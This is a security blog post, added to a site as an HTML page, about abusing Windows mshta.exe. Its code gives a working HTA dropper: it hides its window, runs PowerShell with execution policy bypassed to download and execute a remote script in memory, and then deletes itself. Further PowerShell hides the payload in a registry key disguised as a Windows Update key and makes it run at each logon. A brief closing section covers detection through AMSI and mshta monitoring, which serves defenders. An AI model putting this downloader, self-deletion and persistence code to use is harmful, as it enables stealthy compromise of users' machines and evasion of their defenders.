@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Abusing mshta.exe to Gain PowerShell Access</title>
+    <meta name="description" content="Exploring how attackers leverage mshta.exe to execute PowerShell payloads from HTA files and maintain persistence." />
+    <link rel="stylesheet" href="../assets/css/blog.css" />
+  </head>
+  <body>
+    <header class="masthead">
+      <div class="masthead__inner">
+        <div class="brand">
+          <a class="brand__link" href="../index.html">Charles Dardaman</a>
+          <p class="brand__tagline">Security engineering, incident response, research.</p>
+        </div>
+        <nav class="site-nav" aria-label="Primary">
+          <ul>
+            <li><a href="../index.html#about">About</a></li>
+            <li><a href="../index.html#writing">Writing</a></li>
+            <li><a href="../index.html#connect">Connect</a></li>
+          </ul>
+        </nav>
+      </div>
+    </header>
+
+    <header class="post-header">
+      <h1>Abusing mshta.exe to Gain PowerShell Access</h1>
+      <p><time datetime="2019-01-22">January 22, 2019</time></p>
+    </header>
+
+    <main>
+      <article>
+        <p><em>This article was originally published at <a href="https://www.cyberonesecurity.com/abusing-mshta-exe-to-gain-powershell-access/" target="_blank" rel="noopener">https://www.cyberonesecurity.com/abusing-mshta-exe-to-gain-powershell-access/</a> and is duplicated here for posterity.</em></p>
+
+        <h2>Background</h2>
+        <p>In previous roles focused on malware analysis and defense, a recurring trend observed across the industry has been the rise of fileless malware, particularly the use of <strong>mshta.exe</strong> as an infection vector. As the focus shifts toward <a href="https://cyberonesecurity.com/services/offensive-security/" target="_blank" rel="noopener">offensive security</a>, this technique is worth revisiting for its relevance in red teaming and adversary simulation exercises.</p>
+        <p>Mshta.exe is a signed Microsoft application that runs Microsoft HTML Applications (HTA) files. These are HTML files that execute JavaScript or VBScript outside of the browser, with the full permission of the executing user. Because it is from Microsoft mshta is normally whitelisted and will allow us to execute code under the mshta process.</p>
+
+        <h2>Infection</h2>
+        <p>HTA files will run automatically if a user double clicks on them, because of this HTA files are excellent for Phishing, Malvertising, or Waterhole attacks where the user will click on the file and infect themselves. Writing our own malicious HTA file is super simple and with just a few lines of code, we can use mshta.exe as a downloader or stager for any malicious code that we could want.</p>
+        <p>To start with we want our basic HTML tags and then we add the HTA tag. This tag allows us to specify our app name as well as set all the visibility settings to no so that the victim won’t notice that the HTA file is running.</p>
+        <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;HTA:APPLICATION ID="CS"
+APPLICATIONNAME="Downloader"
+WINDOWSTATE="minimize"
+MAXIMIZEBUTTON="no"
+MINIMIZEBUTTON="no"
+CAPTION="no"
+SHOWINTASKBAR="no"&gt;</code></pre>
+        <p>Once we have the HTA tag set we will write our script to download and execute some malicious PowerShell. In order to do this, we will take advantage of ActiveX and Wscript and pass the command that we want to run in memory along with the 0 flag which will keep anything from popping up on the victim’s machine.</p>
+        <pre><code>&lt;script&gt;
+//We will use Wscript.shell in order to launch PowerShell
+a = new ActiveXObject('Wscript.Shell');
+//Our command to execute
+cmd = "powershell -windowstyle hidden -ep Bypass -nop -noexit -c ((New-Object
+Net.WebClient).DownloadString('https://IP/script.ps1'))";
+//Run the command, 0 is needed so that no PowerShell window will appear
+a.Run(cmd,0);
+&lt;/script&gt;</code></pre>
+        <p>Now that we have our script executing in memory, we need to clean up the HTA file. We can do this with ActiveX again by getting the file location, changing it away from an encoded uri and then removing file:/// from the front of it. We then close the window which closes mshta.exe leaving PowerShell running in the background with our downloaded code executing in memory.</p>
+        <pre><code>&lt;script&gt;
+//We use this in order to get erase the HTA file after it has executed
+b = new ActiveXObject("Scripting.FileSystemObject");
+//Get filename and edit it so that windows can read it properly
+filename = window.location.href;
+filename = decodeURI(filename);
+filename = filename.slice(8);
+//Get a handle on the file
+c = b.GetFile(filename);
+//Delete it
+c.Delete();
+//Close the MSHTA window
+window.close();
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+        <h2>Persistence</h2>
+        <p>Once we get on a victim’s machine, we want to make sure that we do not lose that hard-earned access, but we also want to make sure that we leave as little trace as possible for their blue team to pick up on. In order to do this, we don’t want to put anything directly onto the disk and want to keep everything running in memory.</p>
+        <p>One way this can be completed is with registry keys. Using PowerShell’s Set-ItemProperty we can put more PowerShell script or even EXEs into any registry key that we want, in this case, we download another PowerShell script and then create a Reg Key and put it in the (Default) value.</p>
+        <pre><code>#Download script to be kept in the reg key
+$dl = (New-Object Net.WebClient).DownloadString('https://IP/script.ps1')
+#Creates and sets the default value to our downloaded script
+New-Item -Path HKCU:softwarewow6432nodeMicrosoftWindowsUpdate -Value $dl</code></pre>
+        <p>Once it’s in the registry we can easily pull the data back out of it to execute in memory with Get-ItemProperty and IEX.</p>
+        <pre><code># Get the stored payload
+$value = Get-ItemProperty -Path HKCU:softwarewow6432nodeMicrosoftWindowsUpdate -Name "(Default)"
+#Execute it
+IEX ($value."(Default)")</code></pre>
+        <p>We then can put this script right into the HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionRun reg key and it will execute when the user logs in, pulling our other malicious files, in the registry, and executing them in memory.</p>
+        <figure>
+          <img src="../images/61dcfecfa26af814a1295ca5_mshta-hacks-1024x183.jpeg" alt="Illustration showing mshta-based attack chain" />
+        </figure>
+
+        <h2>Detection</h2>
+        <p>Currently detecting this can be difficult for traditional solutions as no malware touches the disk to be scanned by AV. In order to combat this and other scripting attacks, Microsoft released Anti-Malware Scan Interface or AMSI on Windows. AMSI’s goal is to catch bad scripts running in memory and works with Windows Defender and a few other AVs.</p>
+        <p>Although AMSI is pretty good at detecting malicious scripts it can still be bypassed so you should monitor mshta use, especially when it executes any other applications such as PowerShell. Alerting on these kinds of actions can help you spot an infection as soon as it happens and start to remediate the infected machines.</p>
+
+        <h2>Summary</h2>
+        <p>PowerShell is an amazing tool that allows attackers to do anything they could want on a Windows system and leave little to no trace while they do it. Because of this any signed processes that can be used to run PowerShell should be watched closely because they can and will be used to compromise users’ machines.</p>
+
+        <h2>References</h2>
+        <p>Intro to HTAs:&nbsp;<a href="https://docs.microsoft.com/en-us/previous-versions//ms536496(v=vs.85)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions//ms536496(v=vs.85)</a><br />
+        AMSI Bypass:&nbsp;<a href="https://twitter.com/mattifestation/status/735261176745988096?lang=en" target="_blank" rel="noopener">https://twitter.com/mattifestation/status/735261176745988096?lang=en</a></p>
+      </article>
+      <div class="footer">
+        <a href="../index.html">← Back to homepage</a>
+      </div>
+    </main>
+
+    <footer class="site-footer">
+      <p>&copy; <span id="current-year"></span> Charles Dardaman</p>
+    </footer>
+
+    <script>
+      const year = new Date().getFullYear();
+      document.getElementById("current-year").textContent = year;
+    </script>
+  </body>
+</html>
